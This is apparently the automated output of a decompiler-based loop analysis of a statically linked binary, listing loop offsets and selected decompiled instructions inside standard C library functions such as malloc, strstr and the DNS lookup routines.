		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 212 @ strstr ====================================
++++++++ WHILE START : 35412 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 35514 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 213 @ strcasestr ====================================
++++++++ WHILE START : 36221 
++++++++ WHILE FUNCTION : strcasestr 
++++++++ WHILE END : 36282 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 217 @ malloc ====================================
++++++++ WHILE START : 41303 
++++++++ WHILE FUNCTION : malloc 
++++++++ WHILE END : 43480 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
		free(v244);
=============================WHILE LOOPS ID : 221 @ __malloc_consolidate ====================================
++++++++ WHILE START : 44940 
++++++++ WHILE FUNCTION : __malloc_consolidate 
++++++++ WHILE END : 45062 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 222 @ abort ====================================
++++++++ WHILE START : 45678 
++++++++ WHILE FUNCTION : abort 
++++++++ WHILE END : 45753 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v135, 0);
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 223 @ srandom_r ====================================
++++++++ WHILE START : 46960 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 46995 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)a2, (int32_t)&v138);
		__GI_random_r((int32_t *)a2, (int32_t)&v138);
=============================WHILE LOOPS ID : 228 @ sleep ====================================
++++++++ WHILE START : 48644 
++++++++ WHILE FUNCTION : sleep 
++++++++ WHILE END : 48738 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v139 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v135, v138); // 0x80547bf
		while (true) {
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
		__GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
=============================WHILE LOOPS ID : 231 @ __stdio_WRITE ====================================
++++++++ WHILE START : 54418 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 54492 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 234 @ _fpmaxtostr ====================================
++++++++ WHILE START : 55822 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 59053 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 241 @ __GI_strpbrk ====================================
++++++++ WHILE START : 60169 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 60218 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 242 @ inet_aton ====================================
++++++++ WHILE START : 60367 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 60461 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 243 @ __dns_lookup ====================================
++++++++ WHILE START : 60636 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 61500 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_close(-1);
		if (inet_pton(-1, (char *)v147, v149, (int32_t)&v142) >= 1) {
		inet_addr(-1);
		if (socket(-1, v147, v149) >= 0) {
		if (__libc_connect(-1, v147, v149) >= 0) {
		__libc_send(-1, v147, v149, (int32_t)&v142);
		int32_t v164 = __libc_recv(-1, v147, v149, (int32_t)&v142); // 0x8055ff6
		__libc_close(v137);
		free(v138);
		free(v138);
		while (true) {
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		v203 = __libc_close(-1);
		v204 = free(-1);
		v205 = free(-1);
		v205 = free(-1);
		v203 = __libc_close(-1);
		v204 = free(-1);
		v205 = free(-1);
		v205 = free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		free(-1);
		__libc_close(-1);
		free(-1);
		__libc_close(v137);
		free(v138);
		free(v138);
		__libc_close(v137);
		free(v138);
		free(v138);
		__libc_close(v137);
		free(v138);
		free(v138);
		__libc_close(v137);
		free(v138);
		free(v138);
=============================WHILE LOOPS ID : 245 @ __open_nameservers ====================================
++++++++ WHILE START : 61855 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 62170 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (fgets(v144, 128, v138) == 0) {
		while (true) {
		free(v186);
		__GI_fclose((int16_t *)v135);
		while (true) {
		if (fgets(v144, 128, v138) == 0) {
		if (fgets(v144, 128, v138) == 0) {
		__GI_fclose((int16_t *)v135);
		if (fgets(v144, 128, v138) == 0) {
=============================WHILE LOOPS ID : 246 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 65437 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 65474 
++++++++ INTRESTING INSTRUCTIONS :  
		free(v142);
=============================WHILE LOOPS ID : 248 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 65867 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 65927 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v140 = getc_unlocked(); // 0x8056ef1
=============================WHILE LOOPS ID : 253 @ __GI_strspn ====================================
++++++++ WHILE START : 66657 
++++++++ WHILE FUNCTION : __GI_strspn 
++++++++ WHILE END : 66702 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 255 @ inet_pton ====================================
++++++++ WHILE START : 67247 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 67500 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		if (inet_pton4(v151, (int32_t)v152, v141) >= 1) {
=============================WHILE LOOPS ID : 257 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 67882 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 68230 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		v175 = inet_ntop4((int32_t)v140, (int32_t)v154, v153);
		v171 = v137 + sprintf(v170, (int32_t)"%x");
		v175 = inet_ntop4((int32_t)v140, (int32_t)v154, v153);
		v171 = v137 + sprintf(v170, (int32_t)"%x");
		while (true) {
=============================WHILE LOOPS ID : 261 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 69539 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 69770 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		int32_t v177 = __GI_strcasecmp(v149, v176, v155, v155); // 0x8057aa2
		if (fgets(v150, v135, v133) == 0) {
		if (inet_pton(10, (char *)v180, v137, v156) >= 1) {
		__GI_fclose((int16_t *)v135);
		if (inet_pton(2, (char *)v182, (int32_t)v138, v134) >= 1) {
		__GI_fclose((int16_t *)v135);
		if (fgets(v150, v135, v133) == 0) {
		if (fgets(v150, v135, v133) == 0) {
		__GI_fclose((int16_t *)v135);
=============================WHILE LOOPS ID : 264 @ __decode_dotted ====================================
++++++++ WHILE START : 70895 
++++++++ WHILE FUNCTION : __decode_dotted 
++++++++ WHILE END : 70966 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
